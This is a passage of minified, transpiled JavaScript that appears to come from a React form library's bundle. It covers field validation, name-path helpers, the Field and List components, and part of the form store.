          })
        );
        return function (St, vt) {
          return gt.apply(this, arguments);
        };
      })()
    );
  else {
    var ht = st.map(function (gt) {
      return validateRule(ot, a, gt, s, nt).then(function (St) {
        return { errors: St, rule: gt };
      });
    });
    ft = (tt ? finishOnFirstFailed(ht) : finishOnAllFailed(ht)).then(function (
      gt
    ) {
      return Promise.reject(gt);
    });
  }
  return (
    ft.catch(function (gt) {
      return gt;
    }),
    ft
  );
}
function finishOnAllFailed(i) {
  return _finishOnAllFailed.apply(this, arguments);
}
function _finishOnAllFailed() {
  return (
    (_finishOnAllFailed = _asyncToGenerator(
      _regeneratorRuntime().mark(function i(a) {
        return _regeneratorRuntime().wrap(function (s) {
          for (;;)
            switch ((s.prev = s.next)) {
              case 0:
                return s.abrupt(
                  "return",
                  Promise.all(a).then(function (tt) {
                    var nt,
                      ot = (nt = []).concat.apply(nt, _toConsumableArray(tt));
                    return ot;
                  })
                );
              case 1:
              case "end":
                return s.stop();
            }
        }, i);
      })
    )),
    _finishOnAllFailed.apply(this, arguments)
  );
}
function finishOnFirstFailed(i) {
  return _finishOnFirstFailed.apply(this, arguments);
}
function _finishOnFirstFailed() {
  return (
    (_finishOnFirstFailed = _asyncToGenerator(
      _regeneratorRuntime().mark(function i(a) {
        var o;
        return _regeneratorRuntime().wrap(function (tt) {
          for (;;)
            switch ((tt.prev = tt.next)) {
              case 0:
                return (
                  (o = 0),
                  tt.abrupt(
                    "return",
                    new Promise(function (nt) {
                      a.forEach(function (ot) {
                        ot.then(function (st) {
                          st.errors.length && nt([st]),
                            (o += 1),
                            o === a.length && nt([]);
                        });
                      });
                    })
                  )
                );
              case 2:
              case "end":
                return tt.stop();
            }
        }, i);
      })
    )),
    _finishOnFirstFailed.apply(this, arguments)
  );
}
function getNamePath(i) {
  return toArray$1(i);
}
function cloneByNamePathList(i, a) {
  var o = {};
  return (
    a.forEach(function (s) {
      var tt = get(i, s);
      o = set$1(o, s, tt);
    }),
    o
  );
}
function containsNamePath(i, a) {
  var o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : !1;
  return (
    i &&
    i.some(function (s) {
      return matchNamePath(a, s, o);
    })
  );
}
function matchNamePath(i, a) {
  var o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : !1;
  return !i || !a || (!o && i.length !== a.length)
    ? !1
    : a.every(function (s, tt) {
        return i[tt] === s;
      });
}
function isSimilar(i, a) {
  if (i === a) return !0;
  if (
    (!i && a) ||
    !a ||
    !i ||
    !a ||
    _typeof(i) !== "object" ||
    _typeof(a) !== "object"
  )
    return !1;
  var o = Object.keys(i),
    s = Object.keys(a),
    tt = new Set([].concat(o, s));
  return _toConsumableArray(tt).every(function (nt) {
    var ot = i[nt],
      st = a[nt];
    return typeof ot == "function" && typeof st == "function" ? !0 : ot === st;
  });
}
function defaultGetValueFromEvent(i) {
  var a = arguments.length <= 1 ? void 0 : arguments[1];
  return a && a.target && _typeof(a.target) === "object" && i in a.target
    ? a.target[i]
    : a;
}
function move(i, a, o) {
  var s = i.length;
  if (a < 0 || a >= s || o < 0 || o >= s) return i;
  var tt = i[a],
    nt = a - o;
  return nt > 0
    ? [].concat(
        _toConsumableArray(i.slice(0, o)),
        [tt],
        _toConsumableArray(i.slice(o, a)),
        _toConsumableArray(i.slice(a + 1, s))
      )
    : nt < 0
    ? [].concat(
        _toConsumableArray(i.slice(0, a)),
        _toConsumableArray(i.slice(a + 1, o + 1)),
        [tt],
        _toConsumableArray(i.slice(o + 1, s))
      )
    : i;
}
var _excluded$a = ["name"],
  EMPTY_ERRORS = [];
function requireUpdate(i, a, o, s, tt, nt) {
  return typeof i == "function"
    ? i(a, o, "source" in nt ? { source: nt.source } : {})
    : s !== tt;
}
var Field = (function (i) {
  _inherits(o, i);
  var a = _createSuper(o);
  function o(s) {
    var tt;
    if (
      (_classCallCheck(this, o),
      (tt = a.call(this, s)),
      _defineProperty$1(_assertThisInitialized(tt), "state", { resetCount: 0 }),
      _defineProperty$1(_assertThisInitialized(tt), "cancelRegisterFunc", null),
      _defineProperty$1(_assertThisInitialized(tt), "mounted", !1),
      _defineProperty$1(_assertThisInitialized(tt), "touched", !1),
      _defineProperty$1(_assertThisInitialized(tt), "dirty", !1),
      _defineProperty$1(_assertThisInitialized(tt), "validatePromise", void 0),
      _defineProperty$1(_assertThisInitialized(tt), "prevValidating", void 0),
      _defineProperty$1(_assertThisInitialized(tt), "errors", EMPTY_ERRORS),
      _defineProperty$1(_assertThisInitialized(tt), "warnings", EMPTY_ERRORS),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "cancelRegister",
        function () {
          var ft = tt.props,
            ht = ft.preserve,
            gt = ft.isListField,
            St = ft.name;
          tt.cancelRegisterFunc &&
            tt.cancelRegisterFunc(gt, ht, getNamePath(St)),
            (tt.cancelRegisterFunc = null);
        }
      ),
      _defineProperty$1(_assertThisInitialized(tt), "getNamePath", function () {
        var ft = tt.props,
          ht = ft.name,
          gt = ft.fieldContext,
          St = gt.prefixName,
          vt = St === void 0 ? [] : St;
        return ht !== void 0
          ? [].concat(_toConsumableArray(vt), _toConsumableArray(ht))
          : [];
      }),
      _defineProperty$1(_assertThisInitialized(tt), "getRules", function () {
        var ft = tt.props,
          ht = ft.rules,
          gt = ht === void 0 ? [] : ht,
          St = ft.fieldContext;
        return gt.map(function (vt) {
          return typeof vt == "function" ? vt(St) : vt;
        });
      }),
      _defineProperty$1(_assertThisInitialized(tt), "refresh", function () {
        tt.mounted &&
          tt.setState(function (ft) {
            var ht = ft.resetCount;
            return { resetCount: ht + 1 };
          });
      }),
      _defineProperty$1(_assertThisInitialized(tt), "metaCache", null),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "triggerMetaEvent",
        function (ft) {
          var ht = tt.props.onMetaChange;
          if (ht) {
            var gt = _objectSpread2$1(
              _objectSpread2$1({}, tt.getMeta()),
              {},
              { destroy: ft }
            );
            isEqual(tt.metaCache, gt) || ht(gt), (tt.metaCache = gt);
          } else tt.metaCache = null;
        }
      ),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "onStoreChange",
        function (ft, ht, gt) {
          var St = tt.props,
            vt = St.shouldUpdate,
            _t = St.dependencies,
            Et = _t === void 0 ? [] : _t,
            Ct = St.onReset,
            Pt = gt.store,
            bt = tt.getNamePath(),
            xt = tt.getValue(ft),
            yt = tt.getValue(Pt),
            wt = ht && containsNamePath(ht, bt);
          switch (
            (gt.type === "valueUpdate" &&
              gt.source === "external" &&
              !isEqual(xt, yt) &&
              ((tt.touched = !0),
              (tt.dirty = !0),
              (tt.validatePromise = null),
              (tt.errors = EMPTY_ERRORS),
              (tt.warnings = EMPTY_ERRORS),
              tt.triggerMetaEvent()),
            gt.type)
          ) {
            case "reset":
              if (!ht || wt) {
                (tt.touched = !1),
                  (tt.dirty = !1),
                  (tt.validatePromise = void 0),
                  (tt.errors = EMPTY_ERRORS),
                  (tt.warnings = EMPTY_ERRORS),
                  tt.triggerMetaEvent(),
                  Ct == null || Ct(),
                  tt.refresh();
                return;
              }
              break;
            case "remove": {
              if (vt && requireUpdate(vt, ft, Pt, xt, yt, gt)) {
                tt.reRender();
                return;
              }
              break;
            }
            case "setField": {
              var $t = gt.data;
              if (wt) {
                "touched" in $t && (tt.touched = $t.touched),
                  "validating" in $t &&
                    !("originRCField" in $t) &&
                    (tt.validatePromise = $t.validating
                      ? Promise.resolve([])
                      : null),
                  "errors" in $t && (tt.errors = $t.errors || EMPTY_ERRORS),
                  "warnings" in $t &&
                    (tt.warnings = $t.warnings || EMPTY_ERRORS),
                  (tt.dirty = !0),
                  tt.triggerMetaEvent(),
                  tt.reRender();
                return;
              } else if ("value" in $t && containsNamePath(ht, bt, !0)) {
                tt.reRender();
                return;
              }
              if (vt && !bt.length && requireUpdate(vt, ft, Pt, xt, yt, gt)) {
                tt.reRender();
                return;
              }
              break;
            }
            case "dependenciesUpdate": {
              var kt = Et.map(getNamePath);
              if (
                kt.some(function (Rt) {
                  return containsNamePath(gt.relatedFields, Rt);
                })
              ) {
                tt.reRender();
                return;
              }
              break;
            }
            default:
              if (
                wt ||
                ((!Et.length || bt.length || vt) &&
                  requireUpdate(vt, ft, Pt, xt, yt, gt))
              ) {
                tt.reRender();
                return;
              }
              break;
          }
          vt === !0 && tt.reRender();
        }
      ),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "validateRules",
        function (ft) {
          var ht = tt.getNamePath(),
            gt = tt.getValue(),
            St = ft || {},
            vt = St.triggerName,
            _t = St.validateOnly,
            Et = _t === void 0 ? !1 : _t,
            Ct = Promise.resolve().then(
              _asyncToGenerator(
                _regeneratorRuntime().mark(function Pt() {
                  var bt, xt, yt, wt, $t, kt, Rt;
                  return _regeneratorRuntime().wrap(function (Ot) {
                    for (;;)
                      switch ((Ot.prev = Ot.next)) {
                        case 0:
                          if (tt.mounted) {
                            Ot.next = 2;
                            break;
                          }
                          return Ot.abrupt("return", []);
                        case 2:
                          if (
                            ((bt = tt.props),
                            (xt = bt.validateFirst),
                            (yt = xt === void 0 ? !1 : xt),
                            (wt = bt.messageVariables),
                            ($t = bt.validateDebounce),
                            (kt = tt.getRules()),
                            vt &&
                              (kt = kt
                                .filter(function (Nt) {
                                  return Nt;
                                })
                                .filter(function (Nt) {
                                  var zt = Nt.validateTrigger;
                                  if (!zt) return !0;
                                  var Bt = toArray$1(zt);
                                  return Bt.includes(vt);
                                })),
                            !($t && vt))
                          ) {
                            Ot.next = 10;
                            break;
                          }
                          return (
                            (Ot.next = 8),
                            new Promise(function (Nt) {
                              setTimeout(Nt, $t);
                            })
                          );
                        case 8:
                          if (tt.validatePromise === Ct) {
                            Ot.next = 10;
                            break;
                          }
                          return Ot.abrupt("return", []);
                        case 10:
                          return (
                            (Rt = validateRules(ht, gt, kt, ft, yt, wt)),
                            Rt.catch(function (Nt) {
                              return Nt;
                            }).then(function () {
                              var Nt =
                                arguments.length > 0 && arguments[0] !== void 0
                                  ? arguments[0]
                                  : EMPTY_ERRORS;
                              if (tt.validatePromise === Ct) {
                                var zt;
                                tt.validatePromise = null;
                                var Bt = [],
                                  Wt = [];
                                (zt = Nt.forEach) === null ||
                                  zt === void 0 ||
                                  zt.call(Nt, function (Gt) {
                                    var Vt = Gt.rule.warningOnly,
                                      Mt = Gt.errors,
                                      Ft = Mt === void 0 ? EMPTY_ERRORS : Mt;
                                    Vt
                                      ? Wt.push.apply(
                                          Wt,
                                          _toConsumableArray(Ft)
                                        )
                                      : Bt.push.apply(
                                          Bt,
                                          _toConsumableArray(Ft)
                                        );
                                  }),
                                  (tt.errors = Bt),
                                  (tt.warnings = Wt),
                                  tt.triggerMetaEvent(),
                                  tt.reRender();
                              }
                            }),
                            Ot.abrupt("return", Rt)
                          );
                        case 13:
                        case "end":
                          return Ot.stop();
                      }
                  }, Pt);
                })
              )
            );
          return (
            Et ||
              ((tt.validatePromise = Ct),
              (tt.dirty = !0),
              (tt.errors = EMPTY_ERRORS),
              (tt.warnings = EMPTY_ERRORS),
              tt.triggerMetaEvent(),
              tt.reRender()),
            Ct
          );
        }
      ),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "isFieldValidating",
        function () {
          return !!tt.validatePromise;
        }
      ),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "isFieldTouched",
        function () {
          return tt.touched;
        }
      ),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "isFieldDirty",
        function () {
          if (tt.dirty || tt.props.initialValue !== void 0) return !0;
          var ft = tt.props.fieldContext,
            ht = ft.getInternalHooks(HOOK_MARK),
            gt = ht.getInitialValue;
          return gt(tt.getNamePath()) !== void 0;
        }
      ),
      _defineProperty$1(_assertThisInitialized(tt), "getErrors", function () {
        return tt.errors;
      }),
      _defineProperty$1(_assertThisInitialized(tt), "getWarnings", function () {
        return tt.warnings;
      }),
      _defineProperty$1(_assertThisInitialized(tt), "isListField", function () {
        return tt.props.isListField;
      }),
      _defineProperty$1(_assertThisInitialized(tt), "isList", function () {
        return tt.props.isList;
      }),
      _defineProperty$1(_assertThisInitialized(tt), "isPreserve", function () {
        return tt.props.preserve;
      }),
      _defineProperty$1(_assertThisInitialized(tt), "getMeta", function () {
        tt.prevValidating = tt.isFieldValidating();
        var ft = {
          touched: tt.isFieldTouched(),
          validating: tt.prevValidating,
          errors: tt.errors,
          warnings: tt.warnings,
          name: tt.getNamePath(),
          validated: tt.validatePromise === null,
        };
        return ft;
      }),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "getOnlyChild",
        function (ft) {
          if (typeof ft == "function") {
            var ht = tt.getMeta();
            return _objectSpread2$1(
              _objectSpread2$1(
                {},
                tt.getOnlyChild(
                  ft(tt.getControlled(), ht, tt.props.fieldContext)
                )
              ),
              {},
              { isFunction: !0 }
            );
          }
          var gt = toArray$2(ft);
          return gt.length !== 1 || !reactExports.isValidElement(gt[0])
            ? { child: gt, isFunction: !1 }
            : { child: gt[0], isFunction: !1 };
        }
      ),
      _defineProperty$1(_assertThisInitialized(tt), "getValue", function (ft) {
        var ht = tt.props.fieldContext.getFieldsValue,
          gt = tt.getNamePath();
        return get(ft || ht(!0), gt);
      }),
      _defineProperty$1(
        _assertThisInitialized(tt),
        "getControlled",
        function () {
          var ft =
              arguments.length > 0 && arguments[0] !== void 0
                ? arguments[0]
                : {},
            ht = tt.props,
            gt = ht.name,
            St = ht.trigger,
            vt = ht.validateTrigger,
            _t = ht.getValueFromEvent,
            Et = ht.normalize,
            Ct = ht.valuePropName,
            Pt = ht.getValueProps,
            bt = ht.fieldContext,
            xt = vt !== void 0 ? vt : bt.validateTrigger,
            yt = tt.getNamePath(),
            wt = bt.getInternalHooks,
            $t = bt.getFieldsValue,
            kt = wt(HOOK_MARK),
            Rt = kt.dispatch,
            It = tt.getValue(),
            Ot =
              Pt ||
              function (Gt) {
                return _defineProperty$1({}, Ct, Gt);
              },
            Nt = ft[St],
            zt = gt !== void 0 ? Ot(It) : {},
            Bt = _objectSpread2$1(_objectSpread2$1({}, ft), zt);
          Bt[St] = function () {
            (tt.touched = !0), (tt.dirty = !0), tt.triggerMetaEvent();
            for (
              var Gt, Vt = arguments.length, Mt = new Array(Vt), Ft = 0;
              Ft < Vt;
              Ft++
            )
              Mt[Ft] = arguments[Ft];
            _t
              ? (Gt = _t.apply(void 0, Mt))
              : (Gt = defaultGetValueFromEvent.apply(void 0, [Ct].concat(Mt))),
              Et && (Gt = Et(Gt, It, $t(!0))),
              Gt !== It && Rt({ type: "updateValue", namePath: yt, value: Gt }),
              Nt && Nt.apply(void 0, Mt);
          };
          var Wt = toArray$1(xt || []);
          return (
            Wt.forEach(function (Gt) {
              var Vt = Bt[Gt];
              Bt[Gt] = function () {
                Vt && Vt.apply(void 0, arguments);
                var Mt = tt.props.rules;
                Mt &&
                  Mt.length &&
                  Rt({ type: "validateField", namePath: yt, triggerName: Gt });
              };
            }),
            Bt
          );
        }
      ),
      s.fieldContext)
    ) {
      var nt = s.fieldContext.getInternalHooks,
        ot = nt(HOOK_MARK),
        st = ot.initEntityValue;
      st(_assertThisInitialized(tt));
    }
    return tt;
  }
  return (
    _createClass(o, [
      {
        key: "componentDidMount",
        value: function () {
          var tt = this.props,
            nt = tt.shouldUpdate,
            ot = tt.fieldContext;
          if (((this.mounted = !0), ot)) {
            var st = ot.getInternalHooks,
              ft = st(HOOK_MARK),
              ht = ft.registerField;
            this.cancelRegisterFunc = ht(this);
          }
          nt === !0 && this.reRender();
        },
      },
      {
        key: "componentWillUnmount",
        value: function () {
          this.cancelRegister(), this.triggerMetaEvent(!0), (this.mounted = !1);
        },
      },
      {
        key: "reRender",
        value: function () {
          this.mounted && this.forceUpdate();
        },
      },
      {
        key: "render",
        value: function () {
          var tt = this.state.resetCount,
            nt = this.props.children,
            ot = this.getOnlyChild(nt),
            st = ot.child,
            ft = ot.isFunction,
            ht;
          return (
            ft
              ? (ht = st)
              : reactExports.isValidElement(st)
              ? (ht = reactExports.cloneElement(
                  st,
                  this.getControlled(st.props)
                ))
              : (warningOnce(
                  !st,
                  "`children` of Field is not validate ReactElement."
                ),
                (ht = st)),
            reactExports.createElement(reactExports.Fragment, { key: tt }, ht)
          );
        },
      },
    ]),
    o
  );
})(reactExports.Component);
_defineProperty$1(Field, "contextType", Context);
_defineProperty$1(Field, "defaultProps", {
  trigger: "onChange",
  valuePropName: "value",
});
function WrapperField(i) {
  var a,
    o = i.name,
    s = _objectWithoutProperties$1(i, _excluded$a),
    tt = reactExports.useContext(Context),
    nt = reactExports.useContext(ListContext),
    ot = o !== void 0 ? getNamePath(o) : void 0,
    st = (a = s.isListField) !== null && a !== void 0 ? a : !!nt,
    ft = "keep";
  return (
    st || (ft = "_".concat((ot || []).join("_"))),
    reactExports.createElement(
      Field,
      _extends({ key: ft, name: ot, isListField: st }, s, { fieldContext: tt })
    )
  );
}
function List(i) {
  var a = i.name,
    o = i.initialValue,
    s = i.children,
    tt = i.rules,
    nt = i.validateTrigger,
    ot = i.isListField,
    st = reactExports.useContext(Context),
    ft = reactExports.useContext(ListContext),
    ht = reactExports.useRef({ keys: [], id: 0 }),
    gt = ht.current,
    St = reactExports.useMemo(
      function () {
        var Ct = getNamePath(st.prefixName) || [];
        return [].concat(
          _toConsumableArray(Ct),
          _toConsumableArray(getNamePath(a))
        );
      },
      [st.prefixName, a]
    ),
    vt = reactExports.useMemo(
      function () {
        return _objectSpread2$1(
          _objectSpread2$1({}, st),
          {},
          { prefixName: St }
        );
      },
      [st, St]
    ),
    _t = reactExports.useMemo(
      function () {
        return {
          getKey: function (Pt) {
            var bt = St.length,
              xt = Pt[bt];
            return [gt.keys[xt], Pt.slice(bt + 1)];
          },
        };
      },
      [St]
    );
  if (typeof s != "function")
    return (
      warningOnce(!1, "Form.List only accepts function as children."), null
    );
  var Et = function (Pt, bt, xt) {
    var yt = xt.source;
    return yt === "internal" ? !1 : Pt !== bt;
  };
  return reactExports.createElement(
    ListContext.Provider,
    { value: _t },
    reactExports.createElement(
      Context.Provider,
      { value: vt },
      reactExports.createElement(
        WrapperField,
        {
          name: [],
          shouldUpdate: Et,
          rules: tt,
          validateTrigger: nt,
          initialValue: o,
          isList: !0,
          isListField: ot ?? !!ft,
        },
        function (Ct, Pt) {
          var bt = Ct.value,
            xt = bt === void 0 ? [] : bt,
            yt = Ct.onChange,
            wt = st.getFieldValue,
            $t = function () {
              var Ot = wt(St || []);
              return Ot || [];
            },
            kt = {
              add: function (Ot, Nt) {
                var zt = $t();
                Nt >= 0 && Nt <= zt.length
                  ? ((gt.keys = [].concat(
                      _toConsumableArray(gt.keys.slice(0, Nt)),
                      [gt.id],
                      _toConsumableArray(gt.keys.slice(Nt))
                    )),
                    yt(
                      [].concat(
                        _toConsumableArray(zt.slice(0, Nt)),
                        [Ot],
                        _toConsumableArray(zt.slice(Nt))
                      )
                    ))
                  : ((gt.keys = [].concat(_toConsumableArray(gt.keys), [
                      gt.id,
                    ])),
                    yt([].concat(_toConsumableArray(zt), [Ot]))),
                  (gt.id += 1);
              },
              remove: function (Ot) {
                var Nt = $t(),
                  zt = new Set(Array.isArray(Ot) ? Ot : [Ot]);
                zt.size <= 0 ||
                  ((gt.keys = gt.keys.filter(function (Bt, Wt) {
                    return !zt.has(Wt);
                  })),
                  yt(
                    Nt.filter(function (Bt, Wt) {
                      return !zt.has(Wt);
                    })
                  ));
              },
              move: function (Ot, Nt) {
                if (Ot !== Nt) {
                  var zt = $t();
                  Ot < 0 ||
                    Ot >= zt.length ||
                    Nt < 0 ||
                    Nt >= zt.length ||
                    ((gt.keys = move(gt.keys, Ot, Nt)), yt(move(zt, Ot, Nt)));
                }
              },
            },
            Rt = xt || [];
          return (
            Array.isArray(Rt) || (Rt = []),
            s(
              Rt.map(function (It, Ot) {
                var Nt = gt.keys[Ot];
                return (
                  Nt === void 0 &&
                    ((gt.keys[Ot] = gt.id), (Nt = gt.keys[Ot]), (gt.id += 1)),
                  { name: Ot, key: Nt, isListField: !0 }
                );
              }),
              kt,
              Pt
            )
          );
        }
      )
    )
  );
}
function allPromiseFinish(i) {
  var a = !1,
    o = i.length,
    s = [];
  return i.length
    ? new Promise(function (tt, nt) {
        i.forEach(function (ot, st) {
          ot.catch(function (ft) {
            return (a = !0), ft;
          }).then(function (ft) {
            (o -= 1), (s[st] = ft), !(o > 0) && (a && nt(s), tt(s));
          });
        });
      })
    : Promise.resolve([]);
}
var SPLIT = "__@field_split__";
function normalize(i) {
  return i
    .map(function (a) {
      return "".concat(_typeof(a), ":").concat(a);
    })
    .join(SPLIT);
}
var NameMap = (function () {
    function i() {
      _classCallCheck(this, i), _defineProperty$1(this, "kvs", new Map());
    }
    return (
      _createClass(i, [
        {
          key: "set",
          value: function (o, s) {
            this.kvs.set(normalize(o), s);
          },
        },
        {
          key: "get",
          value: function (o) {
            return this.kvs.get(normalize(o));
          },
        },
        {
          key: "update",
          value: function (o, s) {
            var tt = this.get(o),
              nt = s(tt);
            nt ? this.set(o, nt) : this.delete(o);
          },
        },
        {
          key: "delete",
          value: function (o) {
            this.kvs.delete(normalize(o));
          },
        },
        {
          key: "map",
          value: function (o) {
            return _toConsumableArray(this.kvs.entries()).map(function (s) {
              var tt = _slicedToArray$1(s, 2),
                nt = tt[0],
                ot = tt[1],
                st = nt.split(SPLIT);
              return o({
                key: st.map(function (ft) {
                  var ht = ft.match(/^([^:]*):(.*)$/),
                    gt = _slicedToArray$1(ht, 3),
                    St = gt[1],
                    vt = gt[2];
                  return St === "number" ? Number(vt) : vt;
                }),
                value: ot,
              });
            });
          },
        },
        {
          key: "toJSON",
          value: function () {
            var o = {};
            return (
              this.map(function (s) {
                var tt = s.key,
                  nt = s.value;
                return (o[tt.join(".")] = nt), null;
              }),
              o
            );
          },
        },
      ]),
      i
    );
  })(),
  _excluded$9 = ["name"],
  FormStore = _createClass(function i(a) {
    var o = this;
    _classCallCheck(this, i),
      _defineProperty$1(this, "formHooked", !1),
      _defineProperty$1(this, "forceRootUpdate", void 0),
      _defineProperty$1(this, "subscribable", !0),
      _defineProperty$1(this, "store", {}),
      _defineProperty$1(this, "fieldEntities", []),
      _defineProperty$1(this, "initialValues", {}),
      _defineProperty$1(this, "callbacks", {}),
      _defineProperty$1(this, "validateMessages", null),
      _defineProperty$1(this, "preserve", null),
      _defineProperty$1(this, "lastValidatePromise", null),
      _defineProperty$1(this, "getForm", function () {
        return {
          getFieldValue: o.getFieldValue,
          getFieldsValue: o.getFieldsValue,
          getFieldError: o.getFieldError,
          getFieldWarning: o.getFieldWarning,
          getFieldsError: o.getFieldsError,
          isFieldsTouched: o.isFieldsTouched,
          isFieldTouched: o.isFieldTouched,
          isFieldValidating: o.isFieldValidating,
          isFieldsValidating: o.isFieldsValidating,
          resetFields: o.resetFields,
          setFields: o.setFields,
          setFieldValue: o.setFieldValue,
          setFieldsValue: o.setFieldsValue,
          validateFields: o.validateFields,
          submit: o.submit,
          _init: !0,
          getInternalHooks: o.getInternalHooks,
        };
      }),
      _defineProperty$1(this, "getInternalHooks", function (s) {
        return s === HOOK_MARK
          ? ((o.formHooked = !0),
            {
              dispatch: o.dispatch,
              initEntityValue: o.initEntityValue,
              registerField: o.registerField,
              useSubscribe: o.useSubscribe,
              setInitialValues: o.setInitialValues,
              destroyForm: o.destroyForm,
              setCallbacks: o.setCallbacks,
              setValidateMessages: o.setValidateMessages,
              getFields: o.getFields,
              setPreserve: o.setPreserve,
              getInitialValue: o.getInitialValue,
              registerWatch: o.registerWatch,
            })
          : (warningOnce(
              !1,
              "`getInternalHooks` is internal usage. Should not call directly."
            ),
            null);
      }),
      _defineProperty$1(this, "useSubscribe", function (s) {
        o.subscribable = s;
      }),
      _defineProperty$1(this, "prevWithoutPreserves", null),
      _defineProperty$1(this, "setInitialValues", function (s, tt) {
        if (((o.initialValues = s || {}), tt)) {
          var nt,
            ot = merge$1(s, o.store);
          (nt = o.prevWithoutPreserves) === null ||
            nt === void 0 ||
            nt.map(function (st) {
              var ft = st.key;
              ot = set$1(ot, ft, get(s, ft));
            }),
            (o.prevWithoutPreserves = null),
            o.updateStore(ot);
        }
      }),
      _defineProperty$1(this, "destroyForm", function (s) {
        if (s) o.updateStore({});
        else {
          var tt = new NameMap();
          o.getFieldEntities(!0).forEach(function (nt) {
            o.isMergedPreserve(nt.isPreserve()) || tt.set(nt.getNamePath(), !0);
          }),
            (o.prevWithoutPreserves = tt);
        }
      }),
      _defineProperty$1(this, "getInitialValue", function (s) {
        var tt = get(o.initialValues, s);
        return s.length ? merge$1(tt) : tt;
      }),
      _defineProperty$1(this, "setCallbacks", function (s) {
        o.callbacks = s;
      }),
      _defineProperty$1(this, "setValidateMessages", function (s) {
        o.validateMessages = s;
      }),
      _defineProperty$1(this, "setPreserve", function (s) {
        o.preserve = s;
      }),
      _defineProperty$1(this, "watchList", []),
      _defineProperty$1(this, "registerWatch", function (s) {
        return (
          o.watchList.push(s),
          function () {
            o.watchList = o.watchList.filter(function (tt) {
              return tt !== s;
            });
          }
        );
      }),
      _defineProperty$1(this, "notifyWatch", function () {
        var s =
          arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : [];
        if (o.watchList.length) {
          var tt = o.getFieldsValue(),
            nt = o.getFieldsValue(!0);
          o.watchList.forEach(function (ot) {
            ot(tt, nt, s);
          });
        }
      }),
      _defineProperty$1(this, "timeoutId", null),
      _defineProperty$1(this, "warningUnhooked", function () {}),
      _defineProperty$1(this, "updateStore", function (s) {
        o.store = s;
      }),
      _defineProperty$1(this, "getFieldEntities", function () {
        var s =
          arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : !1;
        return s
          ? o.fieldEntities.filter(function (tt) {
              return tt.getNamePath().length;
            })
          : o.fieldEntities;
      }),
      _defineProperty$1(this, "getFieldsMap", function () {
        var s =
            arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : !1,
          tt = new NameMap();
        return (
          o.getFieldEntities(s).forEach(function (nt) {
            var ot = nt.getNamePath();
            tt.set(ot, nt);
          }),
          tt
        );
      }),
      _defineProperty$1(this, "getFieldEntitiesForNamePathList", function (s) {
        if (!s) return o.getFieldEntities(!0);
        var tt = o.getFieldsMap(!0);
        return s.map(function (nt) {
          var ot = getNamePath(nt);
          return tt.get(ot) || { INVALIDATE_NAME_PATH: getNamePath(nt) };
        });
      }),
      _defineProperty$1(this, "getFieldsValue", function (s, tt) {
        o.warningUnhooked();
        var nt, ot, st;
        if (
          (s === !0 || Array.isArray(s)
            ? ((nt = s), (ot = tt))
            : s &&
              _typeof(s) === "object" &&
              ((st = s.strict), (ot = s.filter)),
          nt === !0 && !ot)
        )
          return o.store;
        var ft = o.getFieldEntitiesForNamePathList(
            Array.isArray(nt) ? nt : null
          ),
          ht = [];
        return (
          ft.forEach(function (gt) {
            var St,
              vt,
              _t =
                "INVALIDATE_NAME_PATH" in gt
                  ? gt.INVALIDATE_NAME_PATH
                  : gt.getNamePath();
            if (st) {
              var Et, Ct;
              if (
                (Et = (Ct = gt).isList) !== null &&
                Et !== void 0 &&
                Et.call(Ct)
              )
                return;
            } else if (!nt && (St = (vt = gt).isListField) !== null && St !== void 0 && St.call(vt)) return;
            if (!ot) ht.push(_t);
            else {
              var Pt = "getMeta" in gt ? gt.getMeta() : null;
              ot(Pt) && ht.push(_t);
            }
          }),
          cloneByNamePathList(o.store, ht.map(getNamePath))
        );
      }),
      _defineProperty$1(this, "getFieldValue", function (s) {
        o.warningUnhooked();
        var tt = getNamePath(s);
        return get(o.store, tt);
      }),
      _defineProperty$1(this, "getFieldsError", function (s) {
        o.warningUnhooked();
        var tt = o.getFieldEntitiesForNamePathList(s);
        return tt.map(function (nt, ot) {
          return nt && !("INVALIDATE_NAME_PATH" in nt)
            ? {
                name: nt.getNamePath(),
                errors: nt.getErrors(),
                warnings: nt.getWarnings(),
              }
            : { name: getNamePath(s[ot]), errors: [], warnings: [] };
        });
      }),
      _defineProperty$1(this, "getFieldError", function (s) {
        o.warningUnhooked();
        var tt = getNamePath(s),
          nt = o.getFieldsError([tt])[0];
        return nt.errors;
      }),
      _defineProperty$1(this, "getFieldWarning", function (s) {
        o.warningUnhooked();
        var tt = getNamePath(s),
          nt = o.getFieldsError([tt])[0];
        return nt.warnings;
      }),
      _defineProperty$1(this, "isFieldsTouched", function () {
        o.warningUnhooked();
        for (var s = arguments.length, tt = new Array(s), nt = 0; nt < s; nt++)
          tt[nt] = arguments[nt];
        var ot = tt[0],
          st = tt[1],
          ft,
          ht = !1;
        tt.length === 0
          ? (ft = null)
          : tt.length === 1
          ? Array.isArray(ot)
            ? ((ft = ot.map(getNamePath)), (ht = !1))
            : ((ft = null), (ht = ot))
          : ((ft = ot.map(getNamePath)), (ht = st));
        var gt = o.getFieldEntities(!0),
          St = function (Pt) {
            return Pt.isFieldTouched();
          };
        if (!ft)
          return ht
            ? gt.every(function (Ct) {
                return St(Ct) || Ct.isList();
              })
            : gt.some(St);
        var vt = new NameMap();
        ft.forEach(function (Ct) {
          vt.set(Ct, []);
        }),
          gt.forEach(function (Ct) {
            var Pt = Ct.getNamePath();
            ft.forEach(function (bt) {
              bt.every(function (xt, yt) {
                return Pt[yt] === xt;
              }) &&
                vt.update(bt, function (xt) {
                  return [].concat(_toConsumableArray(xt), [Ct]);
                });
            });
          });
        var _t = function (Pt) {
            return Pt.some(St);
          },
          Et = vt.map(function (Ct) {
            var Pt = Ct.value;
            return Pt;
          });
        return ht ? Et.every(_t) : Et.some(_t);
      }),
      _defineProperty$1(this, "isFieldTouched", function (s) {
        return o.warningUnhooked(), o.isFieldsTouched([s]);
      }),
      _defineProperty$1(this, "isFieldsValidating", function (s) {
        o.warningUnhooked();
        var tt = o.getFieldEntities();
        if (!s)
          return tt.some(function (ot) {
